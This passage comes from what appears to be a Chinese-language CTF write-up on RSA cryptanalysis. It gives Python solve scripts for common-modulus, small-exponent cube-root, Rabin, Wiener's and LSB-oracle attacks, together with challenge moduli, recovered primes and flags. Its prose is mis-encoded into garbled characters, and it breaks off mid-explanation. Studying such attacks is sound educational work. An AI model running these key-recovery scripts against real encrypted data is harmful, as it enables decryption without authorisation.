class="params">(n)</span>:</span></span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        msg2 += flag[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1 * p2</span><br><span class="line">n2 = p1 * p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4 * p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure><p>n2Ôºån3Â∑≤Áü•ÔºåÂà©Áî®ÂÖ±Ê®°ÊîªÂáªÂæóÂà∞n1ÔºåÁî±<code>gcd(n1,n2)==p1</code>  ÂàÜËß£n1Ôºån2ÔºåÂ∞±ÂèØËß£ÂØÜÂæóÂà∞‰∏§ÈÉ®ÂàÜmsgÔºåÊãºÊé•Âç≥ÂèØ„ÄÇ</p><p>Ëß£È¢òËÑöÊú¨Â¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_py</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># decode encryption.encrypted</span></span><br><span class="line">    s1 = <span class="string">'abdefghijklmpqrtuvwxyz'</span></span><br><span class="line">    s2 = <span class="string">'dmenwfoxgpyhirasbktclu'</span></span><br><span class="line">    f1 = open(<span class="string">'encryption.encrypted'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'encryption.py'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f1.readlines():</span><br><span class="line">            tmp = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                tmp += s2[s1.index(j)] <span class="keyword">if</span> j <span class="keyword">in</span> s1 <span class="keyword">else</span> j</span><br><span class="line">            f2.write(tmp)</span><br><span class="line"><span class="comment"># fix_py()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[n2, n3] = map(<span class="keyword">lambda</span> x: int(base64.b64decode(x).encode(<span class="string">'hex'</span>), <span class="number">16</span>),</span><br><span class="line">               open(<span class="string">'n2&amp;n3'</span>).readlines())</span><br><span class="line">[n1c1, n1c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'n1.encrypted'</span>).readlines())</span><br><span class="line">[msg1c1, msg2c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'ciphertext'</span>).readlines())</span><br><span class="line"><span class="comment"># ÈÄöËøáÂÖ±Ê®°ÊîªÂáªÂæóÂà∞n1</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class="line"><span class="comment"># n1,n2Êúâ‰∏Ä‰∏™ÂÖ±ÊúâË¥®Âõ†Êï∞p1</span></span><br><span class="line"><span class="comment"># n1 += n3  # Â≠òÂú®n3ÊØîn1Â∞èÁöÑÂèØËÉΩÔºåÂπ∂‰∏îÁ°ÆÂÆûÂ¶ÇÊ≠§;Ë≤å‰ºº‰∏ªÂäûÊñπ‰∏≠ÈÄîÊîπÈ¢òÔºåÊään1ÊîπÊàêÂ∞è‰∫én3‰∫Ü„ÄÇ</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line">msg1 = pow(msg1c1, d1, n1)</span><br><span class="line">msg2 = pow(msg2c2, d2, n2)</span><br><span class="line">msg1 = hex(msg1)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = hex(msg2)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> msg1, msg2</span><br><span class="line"><span class="comment"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class="line"><span class="comment"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class="line"><span class="comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Â∞èÊòéÊñáÊîªÂáª"><a href="#Â∞èÊòéÊñáÊîªÂáª" class="headerlink" title="Â∞èÊòéÊñáÊîªÂáª"></a>Â∞èÊòéÊñáÊîªÂáª</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöeËæÉÂ∞èÔºå‰∏ÄËà¨‰∏∫3„ÄÇ</strong> </p><p>ÂÖ¨Èí•eÂæàÂ∞èÔºåÊòéÊñám‰πü‰∏çÂ§ßÁöÑËØùÔºå‰∫éÊòØ<code>m^e=k*n+m</code> ‰∏≠ÁöÑÁöÑkÂÄºÂæàÂ∞èÁîöËá≥‰∏∫0ÔºåÁàÜÁ†¥kÊàñÁõ¥Êé•ÂºÄ‰∏âÊ¨°ÊñπÂç≥ÂèØ„ÄÇ</p><p>PythonÂÆûÁé∞Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_msg</span><span class="params">(e, n, c)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> time.asctime(), <span class="string">"Let's waiting..."</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(c + n * k, e)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> time.asctime(), <span class="string">"...done!"</span></span><br><span class="line">            <span class="keyword">return</span> gmpy2.iroot(c + n * k, <span class="number">3</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="‰æãÂ≠êÔºöExtremely-hard-RSA"><a href="#‰æãÂ≠êÔºöExtremely-hard-RSA" class="headerlink" title="‰æãÂ≠êÔºöExtremely hard RSA"></a>‰æãÂ≠êÔºöExtremely hard RSA</h3><p>È¢òÁõÆÊèê‰æõÁöÑnÊòØ4096‰ΩçÁöÑÔºåe=3„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=int(open(<span class="string">'extremelyhardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">res=gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> i,res</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(res)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="RabinÂä†ÂØÜ‰∏≠ÁöÑNÂèØË¢´ÂàÜËß£"><a href="#RabinÂä†ÂØÜ‰∏≠ÁöÑNÂèØË¢´ÂàÜËß£" class="headerlink" title="RabinÂä†ÂØÜ‰∏≠ÁöÑNÂèØË¢´ÂàÜËß£"></a>RabinÂä†ÂØÜ‰∏≠ÁöÑNÂèØË¢´ÂàÜËß£</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöe==2</strong> </p><p>RabinÂä†ÂØÜÊòØRSAÁöÑË°çÁîüÁÆóÊ≥ïÔºåe==2ÊòØRabinÂä†ÂØÜÂÖ∏ÂûãÁâπÂæÅÔºåÂèØ‰ª•ÁôæÂ∫¶ÊàñÈòÖËØª  <a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rabin_cryptosystem</a>  ‰ª•‰∫ÜËß£Âà∞ËØ¶ÁªÜÁöÑËØ¥ÊòéÔºåËøôÈáåÂè™ÂÖ≥Ê≥®Ëß£ÂØÜÊñπÊ≥ï„ÄÇ‰∏ÄËà¨ÂÖàÈÄöËøáÂÖ∂‰ªñÊñπÊ≥ïÂàÜËß£ÂæóÂà∞pÔºåqÔºåÁÑ∂ÂêéËß£ÂØÜ„ÄÇ</p><p>PythonÂÆûÁé∞Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br></pre></td></tr></table></figure><p>ÂáΩÊï∞ËøîÂõûÂõõ‰∏™Êï∞ÔºåËøôÂÖ∂‰∏≠Âè™Êúâ‰∏Ä‰∏™ÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÊòéÊñáÔºåÈúÄË¶ÅÈÄöËøáÂÖ∂‰ªñÊñπÂºèÈ™åËØÅÔºåÂΩìÁÑ∂CTF‰∏≠ÊòæÁÑ∂Â∞±ÊòØflagÂ≠óÁúº‰∫Ü„ÄÇ</p><p>Ëß£ÂØÜÊñπÊ≥ïÊòØÂèÇÁÖßÁª¥Âü∫ÁôæÁßëÁöÑÔºåÊà™ÂõæÂ¶Ç‰∏ãÔºö</p><p><img src="1531634016545.png" alt="Wiener&#39;s Attack"></p><h3 id="‰æãÂ≠êÔºöJarvis-OJ-hard-RSA"><a href="#‰æãÂ≠êÔºöJarvis-OJ-hard-RSA" class="headerlink" title="‰æãÂ≠êÔºöJarvis OJ hard RSA"></a>‰æãÂ≠êÔºöJarvis OJ hard RSA</h3><p>Ëß£È¢òËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,libnum</span><br><span class="line">n=<span class="number">0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=int(open(<span class="string">'hardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure><h2 id="Wiener‚Äôs-Attack"><a href="#Wiener‚Äôs-Attack" class="headerlink" title="Wiener‚Äôs Attack"></a>Wiener‚Äôs Attack</h2><p> <strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöeËøáÂ§ßÊàñËøáÂ∞è„ÄÇ</strong> </p><p>Â∑•ÂÖ∑Ôºö<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a>  </p><p>Âú®eËøáÂ§ßÊàñËøáÂ∞èÁöÑÊÉÖÂÜµ‰∏ãÔºåÂèØ‰ΩøÁî®ÁÆóÊ≥ï‰ªée‰∏≠Âø´ÈÄüÊé®Êñ≠Âá∫dÁöÑÂÄº„ÄÇËØ¶ÁªÜÁöÑÁÆóÊ≥ïÂéüÁêÜÂèØ‰ª•ÈòÖËØªÔºö<a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html#%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">‰ΩéËß£ÂØÜÊåáÊï∞ÊîªÂáª</a> „ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level2"><a href="#‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level2" class="headerlink" title="‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level2"></a>‰æãÂ≠êÔºö2018Âº∫ÁΩëÊùØnextrsa-Level2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1L</span></span><br><span class="line">e = <span class="number">0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fL</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line"><span class="keyword">print</span> d  <span class="comment">#42043</span></span><br></pre></td></tr></table></figure><h2 id="ÁßÅÈí•Êñá‰ª∂‰øÆÂ§ç"><a href="#ÁßÅÈí•Êñá‰ª∂‰øÆÂ§ç" class="headerlink" title="ÁßÅÈí•Êñá‰ª∂‰øÆÂ§ç"></a>ÁßÅÈí•Êñá‰ª∂‰øÆÂ§ç</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöÊèê‰æõÁ†¥ÊçüÁöÑÁßÅÈí•Êñá‰ª∂„ÄÇ</strong> </p><h3 id="‰æãÂ≠êÔºöJarvis-OJ-God-Like-RSA"><a href="#‰æãÂ≠êÔºöJarvis-OJ-God-Like-RSA" class="headerlink" title="‰æãÂ≠êÔºöJarvis OJ-God Like RSA"></a>‰æãÂ≠êÔºöJarvis OJ-God Like RSA</h3><p>ÂèÇËÄÉ <a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html</a> ‰øÆÂ§çÂ≠òÂÇ®ÁßÅÈí•ÁöÑÊñá‰ª∂ÔºåÂæóÂà∞pÂíåq„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'godlikeRSA.rar/pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    n = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">p = <span class="number">30061432003658510087798871614869318011389940352798147030129806359975911392091235344042288409629143229311060231549478211871643725394470760528211801310601767727834886942210718412087541234398453046895030858579989874035849439867334906873642352112428914855967993998732685221108379784833027771293275558876952608462050146340591449046825135890871650866799299533696175818103240024841274114925018619060818213433528894936128306780366785977567327073724428211445259983614467640785163297734447975723664659822673456683284394386723716344090232882990461174301609971805075768328757325956784604364401827152431260896927633163074694121679</span></span><br><span class="line">q = <span class="number">26136662545551829820746942051638228325025130519175536694008242208616774469870765684858288042819063837180243501117310278632509413217676559484513481677689042623348188876598901642459170232360966754692434316796014314498263800234390539118817050074978421973817764644287745302885861277447227180288605200894138168586207384484170481511828680117688324729381172912436910052489279406590356734739774635376711681212908417321705094537960645308009611045658947359297373154395500467689532455017647450616447445444254910371922944620114234547655209970657063715028350418518417105772707885648587233103869340985670430269862943630137067052883</span></span><br><span class="line"><span class="keyword">print</span> n==p*q</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> e*d%phi</span><br><span class="line">c=int(open(<span class="string">'godlikeRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="comment"># 1370223550024951160390505387130177939237950112048472397389773634788136940247048803373180904499220116137720016277614401463947529601059601275191225565163007356175594695217230371190488219356030961008234353281422568670237109241798409859772276203338663213736672988507101836099731545753186306605979236795416523018072994981230167509019379957053839561135207769133885837247551721998502691458955042383536845772871317832519566606644011038158531192089650858814552702073939336587081668849526410118259284356539710136294431275218448114094635426857980426460905608258535404240097392254948848433684475139365021846569436926295331904560877283857331146381104141185386272078892946248648795223866902960499271054375730866146508724739787771837579817109380817612386428775429383894697178101165350212843220568133053034913426083965937819287414427916848075303046293039426388342757953620799736182799948741710617974079729792088434776370340095313622264898772452440870247810948774919910578850614282925852564445288646487485017449052934955175051072066751519784123645584671119185023928739438748519535869994754998423784897445884244844154563303115861175492133906368196005147361767160830004522010287149025190543608485818909441439294996482797249312140402141744752129890112</span></span><br><span class="line"><span class="comment"># ÊòéÊñáÊòØËøô‰∏™ÔºåflagÊòØÂï•‰∏çÁü•ÈÅì</span></span><br></pre></td></tr></table></figure><h2 id="LSB-Oracle-Attack"><a href="#LSB-Oracle-Attack" class="headerlink" title="LSB Oracle Attack"></a>LSB Oracle Attack</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöÂèØ‰ª•ÈÄâÊã©ÂØÜÊñáÂπ∂Ê≥ÑÈú≤ÊúÄ‰Ωé‰Ωç„ÄÇ</strong> </p><p>Âú®‰∏ÄÊ¨°RSAÂä†ÂØÜ‰∏≠ÔºåÊòéÊñá‰∏∫mÔºåÊ®°Êï∞‰∏∫nÔºåÂä†ÂØÜÊåáÊï∞‰∏∫eÔºåÂØÜÊñá‰∏∫c„ÄÇÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†Âá∫<code>c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n</code> Ôºå Âõ†‰∏∫mÁöÑ‰∏§ÂÄçÂèØËÉΩÂ§ß‰∫énÔºåÊâÄ‰ª•ÁªèËøáËß£ÂØÜÂæóÂà∞ÁöÑÊòéÊñáÊòØ <code>m&#39;=(2*m)%n</code> „ÄÇÊàë‰ª¨ËøòËÉΩÂ§üÁü•ÈÅì <code>m&#39;</code> ÁöÑÊúÄ‰Ωé‰Ωç<code>lsb</code> ÊòØ1ËøòÊòØ0„ÄÇ Âõ†‰∏∫nÊòØÂ•áÊï∞ÔºåËÄå<code>2*m</code> ÊòØÂÅ∂Êï∞ÔºåÊâÄ‰ª•Â¶ÇÊûú<code>lsb</code> ÊòØ0ÔºåËØ¥Êòé<code>(2*m)%n</code> 